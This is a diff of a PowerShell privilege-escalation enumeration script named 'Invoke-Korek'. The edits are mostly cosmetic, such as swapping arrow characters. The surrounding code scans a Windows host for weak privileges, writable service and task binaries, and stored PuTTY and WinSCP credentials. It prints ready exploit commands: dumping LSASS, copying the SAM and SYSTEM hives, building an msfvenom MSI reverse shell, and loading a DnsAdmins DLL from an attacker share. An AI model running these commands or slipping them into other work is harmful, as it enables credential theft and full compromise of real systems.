@@ -90,14 +90,14 @@ function Invoke-Korek {
             $state = $_."State"
             if ($state -match "Enabled") {
                 switch ($name) {
-                    "SeImpersonatePrivilege"      { Hot "SeImpersonatePrivilege ENABLED → JuicyPotato / GodPotato / PrintSpoofer"; Expl "GodPotato.exe -cmd 'cmd /c whoami'"; $anyHot=$true }
-                    "SeAssignPrimaryTokenPrivilege" { Hot "SeAssignPrimaryTokenPrivilege ENABLED → JuicyPotato"; Expl "JuicyPotatoNG.exe -t * -p cmd.exe"; $anyHot=$true }
-                    "SeDebugPrivilege"            { Hot "SeDebugPrivilege ENABLED → dump LSASS"; Expl "procdump.exe -ma lsass.exe lsass.dmp  OR  Task Manager dump"; $anyHot=$true }
-                    "SeBackupPrivilege"           { Hot "SeBackupPrivilege ENABLED → read SAM/SYSTEM/NTDS"; Expl "robocopy C:\Windows\System32\config C:\temp SAM SYSTEM /B"; $anyHot=$true }
-                    "SeTakeOwnershipPrivilege"    { Hit "SeTakeOwnershipPrivilege ENABLED → can take ownership of files" }
-                    "SeLoadDriverPrivilege"       { Hot "SeLoadDriverPrivilege ENABLED → arbitrary kernel code"; Expl "EopLoadDriver + vulnerable driver"; $anyHot=$true }
-                    "SeRestorePrivilege"          { Hit "SeRestorePrivilege ENABLED → can write arbitrary files" }
-                    "SeCreateSymbolicLinkPrivilege" { Hit "SeCreateSymbolicLinkPrivilege ENABLED → symlink attacks" }
+                    "SeImpersonatePrivilege"      { Hot "SeImpersonatePrivilege ENABLED -> JuicyPotato / GodPotato / PrintSpoofer"; Expl "GodPotato.exe -cmd 'cmd /c whoami'"; $anyHot=$true }
+                    "SeAssignPrimaryTokenPrivilege" { Hot "SeAssignPrimaryTokenPrivilege ENABLED -> JuicyPotato"; Expl "JuicyPotatoNG.exe -t * -p cmd.exe"; $anyHot=$true }
+                    "SeDebugPrivilege"            { Hot "SeDebugPrivilege ENABLED -> dump LSASS"; Expl "procdump.exe -ma lsass.exe lsass.dmp  OR  Task Manager dump"; $anyHot=$true }
+                    "SeBackupPrivilege"           { Hot "SeBackupPrivilege ENABLED -> read SAM/SYSTEM/NTDS"; Expl "robocopy C:\Windows\System32\config C:\temp SAM SYSTEM /B"; $anyHot=$true }
+                    "SeTakeOwnershipPrivilege"    { Hit "SeTakeOwnershipPrivilege ENABLED -> can take ownership of files" }
+                    "SeLoadDriverPrivilege"       { Hot "SeLoadDriverPrivilege ENABLED -> arbitrary kernel code"; Expl "EopLoadDriver + vulnerable driver"; $anyHot=$true }
+                    "SeRestorePrivilege"          { Hit "SeRestorePrivilege ENABLED -> can write arbitrary files" }
+                    "SeCreateSymbolicLinkPrivilege" { Hit "SeCreateSymbolicLinkPrivilege ENABLED -> symlink attacks" }
                 }
             }
         }
@@ -107,7 +107,7 @@ function Invoke-Korek {
     # ------------------------------------------------------------------
     # AV / DEFENDER STATE
     # ------------------------------------------------------------------
-    Sec "ANTIVIRUS & DEFENDER STATE"
+    Sec "ANTIVIRUS AND DEFENDER STATE"
     try {
         $def = Get-MpComputerStatus -EA SilentlyContinue
         if ($def) {
@@ -127,10 +127,10 @@ function Invoke-Korek {
         Where-Object { $_.PathName -ne $null } |
         ForEach-Object {
             $svc  = $_
-            $path = $svc.PathName -replace '^"([^"]+)".*','$1'
+            $path = ($svc.PathName -replace '^"([^"]+)".*', '$1').Trim()
             if (-not (Test-Path $path -EA SilentlyContinue)) { return }
             if (Test-Writable $path) {
-                Hot "WRITABLE SERVICE BINARY: '$($svc.Name)' → $path"
+                Hot "WRITABLE SERVICE BINARY: '$($svc.Name)' -> $path"
                 Info "Runs as: $($svc.StartName)"
                 Expl "cp malicious.exe '$path' ; Restart-Service $($svc.Name)"
                 $svcCount++
@@ -220,17 +220,17 @@ function Invoke-Korek {
                 if ($action -and $action.Execute) {
                     $exe = $action.Execute
                     if ((Test-Path $exe -EA SilentlyContinue) -and (Test-Writable $exe)) {
-                        Hot "WRITABLE TASK BINARY: '$($task.TaskName)' → $exe"
+                        Hot "WRITABLE TASK BINARY: '$($task.TaskName)' -> $exe"
                         Info "RunLevel: $($task.Principal.RunLevel) | User: $($task.Principal.UserId)"
                         Expl "Replace $exe with malicious binary and wait for task to run"
                         $taskCount++
                     } else {
                         # Also check if the script/argument file is writable
                         $arg = $action.Arguments
-                        if ($arg -match "([A-Za-z]:\\[^\s]+\.(ps1|bat|cmd|vbs))") {
+                        if ($arg -match '([A-Za-z]:\\[^\s]+\.(ps1|bat|cmd|vbs))') {
                             $scriptPath = $Matches[1]
                             if ((Test-Path $scriptPath -EA SilentlyContinue) -and (Test-Writable $scriptPath)) {
-                                Hot "WRITABLE TASK SCRIPT: '$($task.TaskName)' → $scriptPath"
+                                Hot "WRITABLE TASK SCRIPT: '$($task.TaskName)' -> $scriptPath"
                                 Info "Runs as: $($task.Principal.UserId)"
                                 Expl "Overwrite $scriptPath with malicious code"
                                 $taskCount++
@@ -302,7 +302,7 @@ function Invoke-Korek {
                 $h = Get-Reg $_.PSPath "HostName"
                 $u = Get-Reg $_.PSPath "UserName"
                 if ($h) {
-                    Hit "PuTTY subkey session: $name → $u@$h"
+                    Hit "PuTTY subkey session: $name -> $u@$h"
                     Expl "Try: ssh $u@$h"
                 }
                 # grep values inside subkey for -pw
@@ -343,7 +343,7 @@ function Invoke-Korek {
             $u = Get-Reg $_.PSPath "UserName"
             $p = Get-Reg $_.PSPath "Password"
             if ($h) {
-                Hot "WinSCP session: $($_.PSChildName) → $u@$h"
+                Hot "WinSCP session: $($_.PSChildName) -> $u@$h"
                 if ($p) { Info "Obfuscated password: $p" }
                 Expl "Decrypt: python3 winscppasswd.py $h $u $p"
             }
@@ -486,7 +486,7 @@ function Invoke-Korek {
             } | ForEach-Object {
                 Hit "Service '$($_.Name)' runs as: $($_.StartName)"
                 Info "Binary: $($_.PathName)"
-                Expl "If you own this user account → service binary is privesc target"
+                Expl "If you own this user account -> service binary is privesc target"
             }
         } catch {}
     } else { Info "Not domain-joined; skipped" }
@@ -517,7 +517,7 @@ function Invoke-Korek {
     $aie1 = Get-Reg "HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
     $aie2 = Get-Reg "HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer" "AlwaysInstallElevated"
     if ($aie1 -eq 1 -and $aie2 -eq 1) {
-        Hot "AlwaysInstallElevated ENABLED → MSI privesc"
+        Hot "AlwaysInstallElevated ENABLED -> MSI privesc"
         Expl "msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f msi -o shell.msi"
         Expl "msiexec /quiet /qn /i shell.msi"
     } else { Info "AlwaysInstallElevated not enabled" }
@@ -530,7 +530,7 @@ function Invoke-Korek {
         try {
             $groups = whoami /groups 2>$null
             if ($groups -match "DnsAdmins") {
-                Hot "USER IS IN DNSADMINS → SYSTEM on DC!"
+                Hot "USER IS IN DNSADMINS -> SYSTEM on DC!"
                 Expl "dnscmd DC01 /config /serverlevelplugindll \\ATTACKER\share\malicious.dll"
                 Expl "sc.exe \\DC01 stop dns && sc.exe \\DC01 start dns"
             } else { Info "Not in DnsAdmins" }
@@ -565,7 +565,7 @@ function Invoke-Korek {
         Get-NetIPAddress -EA SilentlyContinue |
         Where-Object { $_.AddressFamily -eq "IPv4" -and $_.IPAddress -ne "127.0.0.1" } |
         ForEach-Object {
-            Hit "Interface: $($_.InterfaceAlias) → $($_.IPAddress)/$($_.PrefixLength)"
+            Hit "Interface: $($_.InterfaceAlias) -> $($_.IPAddress)/$($_.PrefixLength)"
             $myNet     = ($_.IPAddress -split '\.')[0..2] -join '.'
             $scanNet   = $myNet + ".0/" + $_.PrefixLength
             Info "Subnet: $scanNet"
